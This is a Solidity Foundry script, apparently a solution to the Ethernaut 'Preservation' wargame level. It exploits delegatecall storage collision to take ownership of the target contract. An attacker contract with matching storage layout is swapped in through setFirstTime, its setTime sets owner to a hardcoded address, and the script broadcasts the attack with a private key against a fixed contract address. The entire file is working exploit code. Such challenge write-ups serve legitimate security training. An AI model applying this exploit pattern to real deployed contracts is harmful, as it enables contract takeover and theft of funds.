// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Preservation.sol";
import {Script} from "forge-std/Script.sol";

contract AttackerContract {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;

    Preservation public preservationInstance;

    constructor (address _address) {
        preservationInstance = Preservation(_address);
    }

    function setTime(uint256 _time) public {
        owner = 0x6A192a14dbd7e3e5Bf67f091aB39D6245c409ddf;
    }

    function attack() public {
        preservationInstance.setFirstTime(uint256(uint160(address(this))));

        preservationInstance.setFirstTime(1);
    }
}

contract PreservationAttack is Script {
    Preservation public preservation = Preservation(0x215e9525C1a371e449dA36B46273F22C31D65F5b);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        AttackerContract attackerContract = new AttackerContract(address(preservation));

        attackerContract.attack();

    }
}